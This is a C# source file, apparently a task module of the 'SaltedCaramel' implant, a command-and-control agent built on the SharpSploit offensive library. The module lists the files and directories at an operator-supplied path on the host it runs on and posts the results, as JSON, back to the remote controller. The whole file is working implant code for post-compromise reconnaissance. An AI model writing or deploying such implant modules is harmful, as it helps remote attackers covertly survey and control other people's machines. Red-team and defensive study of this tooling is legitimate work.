using Newtonsoft.Json;
using SharpSploit.Enumeration;
using SharpSploit.Generic;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace SaltedCaramel.Tasks
{
    class DirectoryList
    {
        internal static void Execute(SCTask task, SCImplant implant)
        {
            string path = task.@params;
            SharpSploitResultList<Host.FileSystemEntryResult> list;

            try
            {
                if (path != "")
                    list = Host.GetDirectoryListing(path);
                else
                    list = Host.GetDirectoryListing();

                List<Dictionary<string, string>> fileList = new List<Dictionary<string, string>>();

                foreach (Host.FileSystemEntryResult item in list)
                {
                    FileInfo f = new FileInfo(item.Name);
                    Dictionary<string, string> infoDict = new Dictionary<string, string>();
                    try
                    {
                        infoDict.Add("size", f.Length.ToString());
                        infoDict.Add("type", "file");
                        infoDict.Add("name", f.Name);
                        fileList.Add(infoDict);
                    }
                    catch
                    {
                        infoDict.Add("size", "0");
                        infoDict.Add("type", "dir");
                        infoDict.Add("name", item.Name);
                        fileList.Add(infoDict);
                    }
                }

                SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(fileList), task.id);
                implant.PostResponse(response);
                implant.SendComplete(task.id);
            }
            catch (DirectoryNotFoundException)
            {
                Debug.WriteLine($"[!] DirectoryList - ERROR: Directory not found: {path}");
                implant.SendError(task.id, "Error: Directory not found.");
            }
        }
    }
}
